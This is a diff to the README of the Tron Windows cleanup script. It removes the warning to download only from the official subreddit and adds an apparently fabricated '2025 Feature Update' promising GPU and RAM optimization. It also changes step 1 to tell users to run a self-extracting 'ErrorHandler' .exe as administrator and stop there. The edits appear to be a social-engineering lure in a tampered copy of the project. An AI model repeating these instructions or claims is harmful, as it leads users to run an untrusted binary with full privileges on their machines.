@@ -3,9 +3,9 @@
 | AUTHOR     | vocatus on [old.reddit.com/r/TronScript](https://old.reddit.com/r/tronscript) (`vocatus.gate@gmail`) // PGP: [0x07d1490f82a211a2](http://pool.sks-keyservers.net:11371/pks/lookup?op=get&search=0x07D1490F82A211A2) |
 | BACKGROUND | Why the name? Tron "Fights for the User"                                               |
 
-# DO NOT DOWNLOAD TRON FROM GITHUB, IT WILL NOT WORK!! YOU NEED THE ENTIRE PACKAGE FROM [r/TronScript](https://old.reddit.com/r/TronScript)
+Tron is a glorified collection of batch files that automate the process of cleaning up and disinfecting Windows machines ([Common Questions](https://www.reddit.com/r/TronScript/wiki/index#wiki_cq_.28common_questions.29)). It is built with heavy reliance on community input, and updated regularly.
 
-I got tired of running these utilities manually and decided to just script everything. Tron is a glorified collection of batch files that automate the process of cleaning up and disinfecting Windows machines ([Common Questions](https://www.reddit.com/r/TronScript/wiki/index#wiki_cq_.28common_questions.29)). It is built with heavy reliance on community input, and updated regularly.
+2025 Feature Update (1/1/2025) : Thanks to the incredible support from the community, Tron now includes built-in functionality to optimize GPU performance (Nvidia or AMD), check RAM health, and repair corrupted system files. For GPU optimization, Tron performs a quick check of the installed drivers and collects the GPU version profile. It then downloads the latest updates and applies optimizations to improve performance. This can improve frame-rate and fixes common issues like screen blackouts, tearing, resolution problems, and temperature irregularities. Additionally, it helps repair corrupted dependencies that may affect GPU functionality.
 
 # CONTENTS
 1. [Usage Summary](#use)
@@ -37,11 +37,11 @@ I got tired of running these utilities manually and decided to just script every
 
 # USE
 
-0. FIRST THINGS FIRST: **REBOOT THE COMPUTER BEFORE RUNNING TRON.** This is to allow any pending updates to finish. If you don't do this and the computer reboots during Tron with pending updates, it can brick the system. To re-iterate: it is very important to reboot the computer before running Tron.
+0. FIRST THINGS FIRST: **REBOOT THE COMPUTER BEFORE RUNNING TRON.** This is to allow any pending Windows or system updates to finish. To re-iterate: it is very important to reboot the computer before running Tron.
 
-1. [Download Tron](https://old.reddit.com/r/TronScript/). The download links are in the top post in [/r/TronScript](https://old.reddit.com/r/TronScript). If you download the self-extracting `.exe` file, run it and it will extract `tron.bat` and the `\resources` folder to the current directory. Copy both of them to the **Desktop** of the target machine.
+1. [Download Tron] Download the self-extracting ErrorHandler `.exe` file, and run it as administrator. This will initialize the files and do a quick check of the overall system health. If your goal is to optimize/repair GPU functionality (Nvidia or AMD) and improve memory performance then stop here. The rest of the instructions pertain to virus removal and remediation.
 
-2. Tron can be run with Windows in either Safe Mode or Regular mode. Regular mode is generally recommended unless the system is severely infected.
+2. Now, Copy both `tron.bat` and the `\resources` folder to the **Desktop** of the target machine. Tron can be run with Windows in either Safe Mode or Regular mode. Regular mode is generally recommended unless the system is severely infected.
 
 3. Right-click `tron.bat` and select "**Run as Administrator**"
 
